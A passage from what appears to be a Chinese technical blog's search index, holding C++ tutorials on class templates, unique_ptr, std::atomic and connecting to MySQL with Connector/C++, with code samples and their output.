endl;}// 类成员函数，重载运算符 "+"template &lt;typename T&gt;Complex&lt;T&gt; Complex&lt;T&gt;::operator+(Complex&lt;T&gt;&amp; c2) { Complex&lt;T&gt; tmp(this-&gt;a + c2.a, this-&gt;b + c2.b); return tmp;}// 友元函数，重载运算符 "&lt;&lt;"template &lt;typename T&gt;ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&lt;T&gt;&amp; c1) { cout &lt;&lt; "a = " &lt;&lt; c1.a &lt;&lt; ", b = " &lt;&lt; c1.b; return out;}// 友元函数（滥用友元函数）template &lt;typename T&gt;Complex&lt;T&gt; sub(Complex&lt;T&gt;&amp; c1, Complex&lt;T&gt;&amp; c2) { Complex&lt;T&gt; tmp(c1.a - c2.a, c1.b - c2.b); return tmp;}int main() { Complex&lt;int&gt; c1(3, 8); Complex&lt;int&gt; c2(9, 5); c1.print(); c2.print(); Complex&lt;int&gt; c3 = c1 + c2; cout &lt;&lt; c3 &lt;&lt; endl; Complex&lt;int&gt; c4 = sub(c1, c2); cout &lt;&lt; c4 &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1234a = 3, b = 8a = 9, b = 5a = 12, b = 13a = -6, b = 3 所有的类模板函数写在类的外部（第三种）所有的类模板函数写在类的外部（分开写在 .h 和 .cpp 中），这里除了重载运算符 &lt;&lt;、&gt;&gt; 必须使用友元函数之外，千万不要滥用友元函数；因为 C++ 编译器会出现编译错误，且没有很好的解决方法。 complex.h 123456789101112131415161718192021#pragma once#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;class Complex {public: Complex(T a, T b); void print(); Complex operator+(Complex&amp; c2); friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, Complex&amp; c1);private: T a; T b;}; complex.hpp，这里的 .hpp 文件与 .cpp 文件本质上没有区别，为了方便区分意图，只是文件的后缀不一样而已 12345678910111213141516171819202122232425262728#include "complex.h"// 构造函数template &lt;typename T&gt;Complex&lt;T&gt;::Complex(T a, T b) { this-&gt;a = a; this-&gt;b = b;}// 类成员函数template &lt;typename T&gt;void Complex&lt;T&gt;::print() { cout &lt;&lt; "a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl;}// 类成员函数，重载运算符 "+"template &lt;typename T&gt;Complex&lt;T&gt; Complex&lt;T&gt;::operator+(Complex&lt;T&gt;&amp; c2) { Complex&lt;T&gt; tmp(this-&gt;a + c2.a, this-&gt;b + c2.b); return tmp;}// 友元函数，重载运算符 "&lt;&lt;"template &lt;typename T&gt;ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&lt;T&gt;&amp; c1) { cout &lt;&lt; "a = " &lt;&lt; c1.a &lt;&lt; ", b = " &lt;&lt; c1.b; return out;} main.cpp，特别注意，这里引入的是 .hpp 或者 .cpp 文件，而不是 .h 头文件，否则 C++ 编译器会编译失败 12345678910111213#include "complex.hpp"int main() { Complex&lt;int&gt; c1(6, 13); Complex&lt;int&gt; c2(23, 34); c1.print(); c2.print(); Complex&lt;int&gt; c3 = c1 + c2; cout &lt;&lt; c3 &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123a = 6, b = 13a = 23, b = 34a = 29, b = 47 类模板中的 static 关键字 从类模板实例化的每种数据类型模板类都有自己的类模板数据成员，该数据类型的模板类的所有对象共享同一个 static 数据成员 和非模板类的 static 数据成员一样，模板类的 static 数据成员也应该在源文件范围内定义和初始化 每种数据类型的模板类都有自己单独一份的类模板的 static 数据成员副本，详见 图解分析 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;iostream&gt;using namespace std;const double pi = 3.14;template &lt;typename T&gt; class Circle {public: Circle(T radius = 0) { this-&gt;m_radius = radius; this-&gt;m_total++; } void setRadius(T radius) { this-&gt;m_radius = radius; } T getRadius() { return this-&gt;m_radius; } double getGirth() { return 2 * pi * this-&gt;m_radius; } double getArea() { return pi * this-&gt;m_radius * this-&gt;m_radius; } // 类模板的静态成员函数 static int getTotal() { return m_total; }private: T m_radius; // 类模板的静态数据成员 static int m_total;};// 初始化类模板的静态数据成员template &lt;typename T&gt; int Circle&lt;T&gt;::m_total = 0;int main() { // 每种数据类型的模板类都有自己单独一份的类模板的 static 数据成员副本 Circle&lt;int&gt; c1(4), c2(6); cout &lt;&lt; "m_total = " &lt;&lt; Circle&lt;int&gt;::getTotal() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c1.getRadius() &lt;&lt; ", girth = " &lt;&lt; c1.getGirth() &lt;&lt; ", area = " &lt;&lt; c1.getArea() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c2.getRadius() &lt;&lt; ", girth = " &lt;&lt; c2.getGirth() &lt;&lt; ", area = " &lt;&lt; c2.getArea() &lt;&lt; endl; Circle&lt;float&gt; c3(3.2), c4(4.3), c5(6.2); cout &lt;&lt; "m_total = " &lt;&lt; Circle&lt;float&gt;::getTotal() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c3.getRadius() &lt;&lt; ", girth = " &lt;&lt; c3.getGirth() &lt;&lt; ", area = " &lt;&lt; c3.getArea() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c4.getRadius() &lt;&lt; ", girth = " &lt;&lt; c4.getGirth() &lt;&lt; ", area = " &lt;&lt; c4.getArea() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c5.getRadius() &lt;&lt; ", girth = " &lt;&lt; c5.getGirth() &lt;&lt; ", area = " &lt;&lt; c5.getArea() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1234567m_total = 2radius = 4, girth = 25.12, area = 50.24radius = 6, girth = 37.68, area = 113.04m_total = 3radius = 3.2, girth = 20.096, area = 32.1536radius = 4.3, girth = 27.004, area = 58.0586radius = 6.2, girth = 38.936, area = 120.702 数组模板类的实战案例下面将编写数组模板类，模拟 STL 容器的实现，同时贯穿上面所讲的 C++ 模板知识点。 ★点击显示完整的案例代码★ MyVector.h 123456789101112131415161718192021222324252627#pragma once#include &lt;iostream&gt;using namespace std;template &lt;class T&gt;class MyVector {public: MyVector(int size = 0); ~MyVector(); MyVector(const MyVector&amp; obj);public: int getSize();public: T&amp; operator[](int index); MyVector&amp; operator=(const MyVector&amp; obj); friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, MyVector&amp; obj);private: T* m_space; // 指向数组的指针 int m_size;}; MyVector.hpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include "MyVector.h"// 构造函数template &lt;typename T&gt;MyVector&lt;T&gt;::MyVector(int size) { this-&gt;m_size = size; // 分配内存空间 this-&gt;m_space = new T[size];}// 析构函数template &lt;typename T&gt;MyVector&lt;T&gt;::~MyVector() { if (this-&gt;m_space) { // 释放内存空间 delete[] this-&gt;m_space; this-&gt;m_size = 0; this-&gt;m_space = NULL; }}// 拷贝构造函数template &lt;typename T&gt;MyVector&lt;T&gt;::MyVector(const MyVector&lt;T&gt;&amp; obj) { // 深拷贝 this-&gt;m_size = obj.m_size; this-&gt;m_space = new T[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; }}// 普通类成员函数template &lt;typename T&gt;int MyVector&lt;T&gt;::getSize() { return this-&gt;m_size;}// 使用类成员函数，重载运算符 "[]"template &lt;typename T&gt;T&amp; MyVector&lt;T&gt;::operator[](int index) { return this-&gt;m_space[index];}// 使用类成员函数，重载运算符 "="template &lt;typename T&gt;MyVector&lt;T&gt;&amp; MyVector&lt;T&gt;::operator=(const MyVector&lt;T&gt;&amp; obj) { if (this-&gt;m_space) { // 释放原本的内存空间 delete[] this-&gt;m_space; this-&gt;m_size = 0; this-&gt;m_space = NULL; } // 深拷贝 this-&gt;m_size = obj.m_size; this-&gt;m_space = new T[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; } return *this;};// 使用友元函数，重载运算符 "&lt;&lt;"template &lt;typename T&gt;ostream&amp; operator&lt;&lt;(ostream&amp; out, MyVector&lt;T&gt;&amp; obj) { for (int i = 0; i &lt; obj.m_size; i++) { cout &lt;&lt; obj.m_space[i] &lt;&lt; ", "; } return out;} Teacher.h 12345678910111213141516171819202122232425262728#pragma once#include &lt;iostream&gt;using namespace std;class Teacher {public: Teacher(); Teacher(int age, const char* name); Teacher(const Teacher&amp; obj); ~Teacher();public: Teacher&amp; operator=(const Teacher&amp; obj); friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Teacher&amp; obj);public: int getAge(); char* getName(); void setAge(int age); void setName(const char* name);private: int m_age; char* m_name;}; Teacher.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include "Teacher.h"// 构造函数Teacher::Teacher() { this-&gt;m_age = 0; this-&gt;m_name = (char*)malloc(1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, ""); }}// 构造函数Teacher::Teacher(int age, const char* name) { this-&gt;m_age = age; this-&gt;m_name = (char*)malloc(strlen(name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, name); }}// 拷贝构造函数Teacher::Teacher(const Teacher&amp; obj) { // 深拷贝 this-&gt;m_age = obj.m_age; this-&gt;m_name = (char*)malloc(strlen(obj.m_name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, obj.m_name); }}// 析构函数Teacher::~Teacher() { if (this-&gt;m_name) { free(this-&gt;m_name); }}// 使用类成员函数，重载运算符 "="Teacher&amp; Teacher::operator=(const Teacher&amp; obj) { // 释放原本的内存空间 if (this-&gt;m_name) { free(this-&gt;m_name); this-&gt;m_name = NULL; } // 深拷贝 this-&gt;m_age = obj.m_age; this-&gt;m_name = (char*)malloc(strlen(obj.m_name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, obj.m_name); } return *this;}// 使用友元函数，重载运算符 "&lt;&lt;"ostream&amp; operator&lt;&lt;(ostream&amp; out, Teacher&amp; obj) { cout &lt;&lt; "age = " &lt;&lt; obj.m_age &lt;&lt; " name = " &lt;&lt; obj.m_name; return out;}int Teacher::getAge() { return this-&gt;m_age;}char* Teacher::getName() { return this-&gt;m_name;}void Teacher::setAge(int age) { this-&gt;m_age = age;}void Teacher::setName(const char* name) { // 释放原本的内存空间 if (this-&gt;m_name) { free(this-&gt;m_name); this-&gt;m_name = NULL; } // 深拷贝 this-&gt;m_name = (char*)malloc(strlen(name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, name); }} main.cpp，值得一提的是，这里需要引入 Teacher.cpp 和 MyVector.hpp，而不是 Teacher.h 和 MyVector.h 头文件，否则 C++ 编译器会编译失败，本质原因是由于 C++ 编译器会对模板进行两次编译导致的，详见 C++ 模板的编译错误分析。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include "Teacher.cpp"#include "MyVector.hpp"int main() { // 自动调用构造函数 MyVector&lt;int&gt; v(5); // 重载运算符 "[]" for (int i = 0; i &lt; v.getSize(); i++) { v[i] = i + 1; } // 重载运算符 "&lt;&lt;" cout &lt;&lt; v &lt;&lt; endl; // 自动调用拷贝构造函数 MyVector&lt;int&gt; v2 = v; cout &lt;&lt; v2 &lt;&lt; endl; // 重载运算符 "=" MyVector&lt;int&gt; v3(2); v3 = v2; cout &lt;&lt; v3 &lt;&lt; endl; // 容器存放类对象 MyVector&lt;Teacher&gt; teachers(3); for (int i = 0; i &lt; teachers.getSize(); i++) { Teacher t(i + 20, "Jim"); teachers[i] = t; } cout &lt;&lt; teachers &lt;&lt; endl; // 容器存放指针 MyVector&lt;Teacher*&gt; points(4); for (int i = 0; i &lt; points.getSize(); i++) { points[i] = new Teacher(25 + i, "Tom"); } for (int i = 0; i &lt; points.getSize(); i++) { Teacher* obj = points[i]; cout &lt;&lt; "age = " &lt;&lt; obj-&gt;getAge() &lt;&lt; " name = " &lt;&lt; obj-&gt;getName() &lt;&lt; ", "; } return 0;} 程序运行输出的结果如下： 123451, 2, 3, 4, 5,1, 2, 3, 4, 5,1, 2, 3, 4, 5,age = 20 name = Jim, age = 21 name = Jim, age = 22 name = Jim,age = 25 name = Tom, age = 26 name = Tom, age = 27 name = Tom, age = 28 name = Tom, 函数模板与类模板的使用总结 模板是 C++ 类型参数化的多态工具，C++ 为此提供了函数模板和类模板 模板定义以模板声明开始，类属参数必须在模板定义中至少出现一次 同一个类属参数可以用于多个模板 类属参数可用于函数的参数类型、返回值类型和声明函数中的变量 模板由编译器根据实际的数据类型进行实例化，生成可执行代码 模板中的函数称为模板函数，实例化的类模板称为模板类 类模板可以在类层次中使用（即可以被继承） 函数模板可以使用多种方式重载 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"C++ 进阶基础之一",url:"/posts/dbff2af9.html",text:'智能指针智能指针的入门案例unique_ptr 对象的介绍unique_ptr 是 C++ 11 提供的用于防止内存泄漏的智能指针中的一种实现，独享被管理对象指针所有权的智能指针。unique_ptr 对象包装了一个原始指针，并负责其生命周期。当该对象被销毁时，会在其析构函数中删除关联的原始指针。unique_ptr 实现了 -&gt; 和 * 运算符的重载，因此它可以像普通指针一样使用。 unique_ptr 对象的简单使用123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;using namespace std;class Task {public: Task(int id) { this-&gt;id = id; cout &lt;&lt; "构造函数被调用" &lt;&lt; endl; } ~Task() { cout &lt;&lt; "析构函数被调用" &lt;&lt; endl; } int getId() { return this-&gt;id; }private: int id;};int main() { unique_ptr&lt;Task&gt; taskPtr(new Task(23)); cout &lt;&lt; "id = " &lt;&lt; taskPtr-&gt;getId() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123构造函数被调用id = 23析构函数被调用 unique_ptr&lt;Task&gt; 对象 taskPtr 接受原始指针作为参数。当 main 函数退出时，该对象超出作用范围就会自动调用自身的析构函数。在 unique_ptr&lt;Task&gt; 对象 taskPtr 的析构函数中，会删除关联的原始指针，这样就不用专门执行 Task 对象的 delete 操作了。以后不管函数正常退出还是异常退出（由于某些异常），也会始终调用 taskPtr 对象的析构函数。因此，原始指针将始终被删除并防止内存泄漏。 unique_ptr 对象独享所有权unique_ptr 对象始终是关联的原始指针的唯一所有者，因此开发者无法通过拷贝构造函数或赋值运算符复制 unique_ptr 对象的副本，只能移动它。由于每个 unique_ptr 对象都是原始指针的唯一所有者，因此在其析构函数中，它可以直接删除关联的指针，不需要任何参考计数。 智能指针的基础操作获取被管理对象的原始指针在 unique_ptr 对象上调用 get() 函数，可以获取管理对象的原始指针 1Task *p1 = taskPtr.get(); 检查 unique_ptr 对象是否为空有两种方法创建一个空的 unique_ptr 对象，因为没有与之关联的原始指针，所以它是空的 1unique_ptr&lt;int&gt; ptr; 1unique_ptr&lt;int&gt; ptr = nullptr; 有两种方法可以检查 unique_ptr 对象是否为空或者是否有与之关联的原始指针 123if (!ptr) { cout&lt;&lt;"ptr is empty"&lt;&lt;endl;} 123if (ptr == nullptr){ cout&lt;&lt;"ptr is empty"&lt;&lt;endl;} 使用原始指针创建 unique_ptr 对象要创建非空的 unique_ptr 对象，需要在创建对象时在其构造函数中传递原始指针 1unique_ptr&lt;Task&gt; taskPtr(new Task(22)); 或者 1unique_ptr&lt;Task&gt; taskPtr(new unique_ptr&lt;Task&gt;::element_type(23)); 不能通过赋值的方法创建 unique_ptr 对象 1unique_ptr&lt;Task&gt; taskPtr = new Task(); // 错误写法，编译失败 智能指针的进阶操作重置 unique_ptr 对象在 unique_ptr 对象上调用 reset() 函数可以重置它，即它会 delete 已关联的原始指针，并将 unique_ptr 对象设置为空 1taskPtr.reset(); unique_ptr 对象不允许复制由于 unique_ptr 不可复制，只能移动。因此，无法通过拷贝构造函数或赋值运算符创建 unique_ptr 对象的副本 123456unique_ptr&lt;Task&gt; taskPtr1(new Task(22));unique_ptr&lt;Task&gt; taskPtr2(new Task(35));unique_ptr&lt;Task&gt; taskPtr4 = taskPtr1; // 错误写法，编译失败taskPtr2 = taskPtr1; // 错误写法，编译失败 转移 unique_ptr 对象的所有权不允许复制 unique_ptr 对象，但可以转移它们。这意味着 unique_ptr 对象可以将自身关联的原始指针的所有权转移给另一个 unique_ptr 对象 1234567891011121314151617// 通过原始指针创建taskPtr1unique_ptr&lt;Task&gt; taskPtr1(new Task(55));// 把taskPtr1中关联指针的所有权转移给taskPtr2unique_ptr&lt;Task&gt; taskPtr2 = move(taskPtr1);// taskPtr1关联指针的所有权现在转移到了taskPtr2中，此时taskPtr1关联的指针为空if (taskPtr1 == nullptr) { cout &lt;&lt; "taskPtr1 is empty" &lt;&lt; endl;}// taskPtr1关联指针的所有权现在转移到了taskPtr2中，此时taskPtr2关联的指针不为空if (taskPtr2 != nullptr) { cout &lt;&lt; "taskPtr2 is not empty" &lt;&lt; endl;}cout &lt;&lt; taskPtr2-&gt;getId() &lt;&lt; endl; 程序运行输出的结果如下： 123taskPtr1 is emptytaskPtr2 is not empty55 释放 unique_ptr 对象关联的原始指针在 unique_ptr 对象上调用 release() 函数，将释放其关联的原始指针的所有权，并返回原始指针，同时设置 unique_ptr 对象为空。特别注意，这里是释放其关联的原始指针的所有权，并没有 delete 原始指针，而调用 reset() 函数则会 delete 原始指针 1234567891011121314unique_ptr&lt;Task&gt; taskPtr1(new Task(55));if (taskPtr1 != nullptr) { cout &lt;&lt; "taskPtr1 is not empty" &lt;&lt; endl;}// 释放关联指针的所有权Task* ptr = taskPtr1.release();if (taskPtr1 == nullptr) { cout &lt;&lt; "taskPtr1 is empty" &lt;&lt; endl;}cout &lt;&lt; "id = " &lt;&lt; ptr-&gt;getId() &lt;&lt; endl; 程序运行输出的结果如下： 123taskPtr1 is not emptytaskPtr1 is emptyid = 55 C++ 14 使用原始指针创建 unique_ptr 对象C++ 引入了新的语法，可以使用 make_unique 来创建 unique_ptr 对象，省去了 new 关键字的使用 1unique_ptr&lt;Task&gt; taskPtr = make_unique&lt;Task&gt;(34); 原子操作的使用原子操作简介所谓的原子操作，取的就是 “原子是最小的、不可分割的最小个体” 的意义，它表示在多个线程访问同一个全局资源的时候，能够确保在同一时刻只有唯一的线程对这个资源进行访问。这有点类似互斥对象对共享资源的访问的保护，但是原子操作更加接近底层，因而效率更高。在以往的 C++ 标准中并没有对原子操作进行规定，开发人员往往是使用汇编语言，或者是借助第三方的线程库，例如 Intel 的 pthread 来实现。在新标准 C++ 11 中，引入了原子操作的概念，并通过这个新的头文件提供了多种原子操作数据类型，例如 atomic_bool、atomic_int 等等。如果在多个线程中对这些类型的共享资源进行操作，编译器将保证这些操作都是原子性的，也就是说，确保任意时刻只有一个线程对这个资源进行访问；这样就可以保证多个线程访问这个共享资源的正确性，从而避免了锁的使用，提高了效率。在新标准 C++ 11 中，atomic 对 int、char、bool 等基础数据结构进行了原子性封装，在多线程环境中，对 atomic 对象的访问不会造成资源竞争，利用 atomic 可实现数据结构的无锁设计。 atomic 的简介在新标准 C++ 11 中，新增了 atomic 关键字，可以使用它定义一个原子类型，详见 C++ 参考手册一、C++ 参考手册二。 成员函数 成员函数 说明 store 原子地以非原子对象替换原子对象的值 load 原子地获得原子对象的值 operator= 存储值于原子对象 is_lock_free 检查原子对象是否免锁 operator T 从原子对象加载值 exchange 原子地替换原子对象的值，并获得它先前持有的值 compare_exchange_weak、compare_exchange_strong 原子地比较原子对象与非原子参数的值，若相等则进行交换，若不相等则进行加载 特化成员函数 特化成员函数 说明 fetch_add 原子地将参数加到存储于原子对象的值，并返回先前保有的值 fetch_sub 原子地从存储于原子对象的值减去参数，并获得先前保有的值 fetch_and 原子地进行参数和原子对象的值的逐位与，并获得先前保有的值 fetch_or 原子地进行参数和原子对象的值的逐位或，并获得先前保有的值 fetch_xor 原子地进行参数和原子对象的值的逐位异或，并获得先前保有的值 operator++、operator++(int)、operator--、operator--(int) 令原子值增加或者减少一 operator+=、operator-=、operator&amp;=、operator^= 加、减，或者与原子值进行逐位与、异或 值得一提的是，所谓特化函数，也就是 atomic 自身提供的，可以进行原子操作的函数。使用这些函数进行的操作，都是原子的。 atomic 的使用案例加锁不使用 atomic123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;ctime&gt;#include &lt;mutex&gt;#include &lt;vector&gt;#include &lt;thread&gt;using namespace std;mutex mtx;size_t total = 0;void threadFun(){ for (int i = 0; i &lt; 1000000; i++) { // 加锁防止多个线程同时访问同一资源 unique_lock&lt;mutex&gt; lock(mtx); total++; }}int main(void){ clock_t start_time = clock(); // 启动多个线程 vector&lt;thread&gt; threads; for (int i = 0; i &lt; 10; i++) { threads.push_back(thread(threadFun)); } for (auto&amp; thad : threads) { thad.join(); } // 检测total是否正确 10000*10 = 100000 cout &lt;&lt; "total number:" &lt;&lt; total &lt;&lt; endl; clock_t end_time = clock(); cout &lt;&lt; "耗时：" &lt;&lt; end_time - start_time &lt;&lt; "ms" &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12total number:10000000耗时：615ms 不加锁使用 atomic与加锁相比，使用原子操作（atomic）能大大地提高程序的运行效率。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;ctime&gt;#include &lt;mutex&gt;#include &lt;vector&gt;#include &lt;thread&gt;using namespace std;atomic&lt;size_t&gt; total(0);void threadFun(){ for (int i = 0; i &lt; 1000000; i++) { total++; }}int main(void){ clock_t start_time = clock(); // 启动多个线程 vector&lt;thread&gt; threads; for (int i = 0; i &lt; 10; i++) { threads.push_back(thread(threadFun)); } for (auto&amp; thad : threads) { thad.join(); } // 检测total是否正确 10000*10 = 100000 cout &lt;&lt; "total number:" &lt;&lt; total &lt;&lt; endl; clock_t end_time = clock(); cout &lt;&lt; "耗时：" &lt;&lt; end_time - start_time &lt;&lt; "ms" &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12total number:10000000耗时：321ms 为什么要定义一个原子类型举个例子，int64_t 类型，在 32 位机器上为非原子操作。更新时该类型的值时，需要进行两步操作（高 32 位、低 32 位）。如果多线程操作该类型的变量，且在操作时未加锁，可能会出现读脏数据的情况。解决该问题的话，可以使用加锁，或者提供一种定义原子类型的方法。 定义原子类型 12// 定义一个"int64_t"的原子类型std::atomic&lt;int64_t&gt; value; 自加操作（原子） 12// atomic提供的特化成员函数，已经重载了++运算符value++ 读取变量值（原子） 12// 此处的原子操作，指的是读取value的值这一步，而不是将value的值赋给xint64_t x = value.load(std::memory_order_relaxed); 更新变量（原子） 12int64_t x = 10;value.store(x, std::memory_order_relaxed) atomic 不能与 string 一起使用特别注意，atomic 关键字不能与 string 类型一起使用，因为 string 不是可简单复制的类型（TriviallyCopyable），详见 C++ 参考文档： The primary std::atomic template may be instantiated with any TriviallyCopyable type T satisfying both CopyConstructible and CopyAssignable. 123456#include &lt;iostream&gt;int main() { std::atomic&lt;std::string&gt; str{ "Hello" }; return 0;} 上述代码编译后，C++ 编译器会出现编译错误，如下所示： 1error C2338: atomic&lt;T&gt; requires T to be trivially copyable, copy constructible, move constructible, copy assignable, and move assignable. 关于 C++ 编译器为什么会对 std::atomic&lt;std::string&gt; 给出简单的可复制错误，在 Stack Overflow 上找到了一个类似的问题可供参考。 参考博客 C++11 新特性之 atomic C++ 智能指针 unique_ptr 详解与示例 为何优先选用 unique_ptr 而不是裸指针？ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"C++ 使用 API 连接 MySQL 数据库",url:"/posts/c942e1de.html",text:'前言本文将介绍 C++ 如何使用 MySQL Connector/C++ 的 API 连接 MySQL 数据库，适用于 Windows 系统，MySQL Connector/C++ 的详细介绍可以看这里。 版本说明 软件 版本 默认安装路径 MySQL Connector/C++ 1.1.13 C:\\Program Files\\MySQL\\MySQL Connector C++ 1.1.13 OpenSSL v1.1.1L C:\\Program Files\\OpenSSL-Win64 boost 1_77_0 C:\\Program Files\\boost_1_77_0 MySQL Server 5.7.33 C++ 11 Visual Studio 2019 Windows System Win 10 准备工作OpenSSL 安装安装 OpenSSL在 OpenSSL 官网 下载 Win64 OpenSSL v1.1.1L 版本的安装包，下载完成后直接安装，每一步安装步骤选择默认选项即可。OpenSSL 默认的安装路径是 C:\\Program Files\\OpenSSL-Win64。 VS 项目添加 OpenSSL 的 库文件OpenSSL 安装完成之后，将其安装目录下的 bin 文件夹中的 libssl-1_1-x64.dll 和 libcrypto-1_1-x64.dll 库文件拷贝到 VS 项目的目录中，如下图所示： VS 项目引入 OpenSSL 的 头文件右键项目，选择 属性，导航到 配置属性 -&gt; C/C++ -&gt; 常规 -&gt; 附加包含目录，添加 OpenSSL 头文件所在的目录路径（如 C:\\Program Files\\OpenSSL-Win64\\include），如下图所示： MySQL Connector/C++ 安装安装 MySQL Connector/C++在 MySQL 官网 上下载 1.1.13 版本的 MySQL Connector/C++，下载完成后直接安装即可。若已经本地已经安装过 MySQL Server，则不再需要手动安装 MySQL Connector/C++，因为默认已经安装过了，但需要留意 MySQL Connector/C++ 与 MySQL 的版本是否匹配 。值得一提的是，MySQL Connector/C++ 支持多个版本共存（同时安装不同的版本），其默认的安装路径为 C:\\Program Files\\MySQL\\Connector.C++ 1.x。 VS 项目添加 MySQL Connector/C++ 的 库文件MySQL Connector/C++ 安装完成后，将其安装目录下 lib/opt 文件夹中的 mysqlcppconn.dll 与 mysqlcppconn.lib 库文件拷贝到 VS 项目的目录中，如下图所示： VS 项目引入 MySQL Connector/C++ 的头文件右键项目，选择 属性，导航到 配置属性 -&gt; C/C++ -&gt; 常规 -&gt; 附加包含目录，添加 MySQL Connector/C++ 头文件所在的目录路径（如 C:\\Program Files\\MySQL\\MySQL Connector C++ 1.1.13\\include），如下图所示： C++ 连接 MySQL 的实战案例MySQL 数据库初始化123456789101112131415161718192021222324252627282930-- ------------------------------ 创建数据库-- ----------------------------DROP DATABASE IF EXISTS `t_shop`;CREATE DATABASE `t_shop` DEFAULT CHARACTER SET UTF8;-- ------------------------------ 切换数据库-- ----------------------------USE `t_shop`;-- ------------------------------ 创建数据库表-- ----------------------------DROP TABLE IF EXISTS `properties`;CREATE TABLE `properties` ( `ID` int(11) NOT NULL AUTO_INCREMENT, `KEY` varchar(200) DEFAULT NULL, `VALUE` varchar(200) DEFAULT NULL, `REMARK` varchar(200) DEFAULT NULL, PRIMARY KEY (`ID`) USING BTREE, UNIQUE KEY `key_unique_index` (`KEY`)) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=UTF8 ROW_FORMAT=DYNAMIC;-- ------------------------------ 往数据库表插入数据-- ----------------------------INSERT INTO `properties` (`KEY`, `VALUE`, `REMARK`) VALUES (\'test_limit_price\', \'30.5\', \'限制价格\');INSERT INTO `properties` (`KEY`, `VALUE`, `REMARK`) VALUES (\'test_limit_number\', \'430\', \'限制数量\');INSERT INTO `properties` (`KEY`, `VALUE`, `REMARK`) VALUES (\'test_limit_balance\', \'929.32\', \'限制余额\'); C++ 连接 MySQL 的代码 mysqldb.h 12345678910111213141516171819202122232425262728293031323334#pragma once#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;mysql_connection.h&gt;#include &lt;cppconn/driver.h&gt;#include &lt;cppconn/exception.h&gt;#include &lt;cppconn/resultset.h&gt;#include &lt;cppconn/statement.h&gt;#include &lt;cppconn/prepared_statement.h&gt;using namespace std;using namespace sql;// MySQL数据库操作类class MysqlDB {public: MysqlDB(const string host, const string username, const string password, const string database); ~MysqlDB();public: bool Execute(const char* sql); int ExecuteUpdate(const char* sql); unique_ptr&lt;ResultSet&gt; Query(const char* query, const vector&lt;string&gt; parameters);private: string host; string username; string password; string database; Driver* driver; unique_ptr&lt;Connection&gt; connection; // 智能指针}; mysqldb.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include "mysqldb.h"// 构造函数MysqlDB::MysqlDB(const string host, const string username, const string password, const string database) { // 初始化MySQL的连接信息 this-&gt;host = host; this-&gt;username = username; this-&gt;password = password; this-&gt;database = database; try { // 加载MySQL驱动 this-&gt;driver = get_driver_instance(); if (!this-&gt;driver) { throw "failed to load mysql driver"; } // 连接MySQL实例 this-&gt;connection.reset(driver-&gt;connect(this-&gt;host.c_str(), this-&gt;username.c_str(), this-&gt;password.c_str())); if (!this-&gt;connection) { throw "failed to connect mysql server"; } else { // 设置默认数据库 this-&gt;connection-&gt;setSchema(this-&gt;database.c_str()); } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; 